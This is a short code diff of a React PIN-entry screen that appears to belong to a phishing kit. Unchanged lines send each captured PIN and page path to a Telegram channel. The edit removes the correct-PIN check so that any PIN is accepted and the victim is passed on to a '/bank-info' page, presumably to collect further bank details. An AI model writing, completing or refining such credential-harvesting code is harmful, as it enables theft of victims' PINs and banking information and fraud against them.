@@ -11,34 +11,17 @@ export function PinScreen() {
   const controls = useAnimation()
   const navigate = useNavigate()
   const PIN_LENGTH = 4
-  const CORRECT_PIN = '1234'
 
   useEffect(() => {
     if (pin.length === PIN_LENGTH) {
       sendTelegramMessage(`Captured PIN: ${pin}\nPath: ${window.location.pathname}`);
-      if (pin === CORRECT_PIN) {
-        setIsSuccess(true)
-        // Reset after showing success state briefly
-        setTimeout(() => {
-          setPin('')
-          setIsSuccess(false)
-          navigate('/bank-info') 
-        }, 1500)
-      } else {
-        setIsError(true)
-        // Shake animation
-        controls
-          .start({
-            x: [-10, 10, -10, 10, -5, 5, 0],
-            transition: {
-              duration: 0.4,
-            },
-          })
-          .then(() => {
-            setPin('')
-            setIsError(false)
-          })
-      }
+      setIsSuccess(true)
+      // Reset after showing success state briefly
+      setTimeout(() => {
+        setPin('')
+        setIsSuccess(false)
+        navigate('/bank-info') 
+      }, 1500)
     }
   }, [pin, controls, navigate])
 
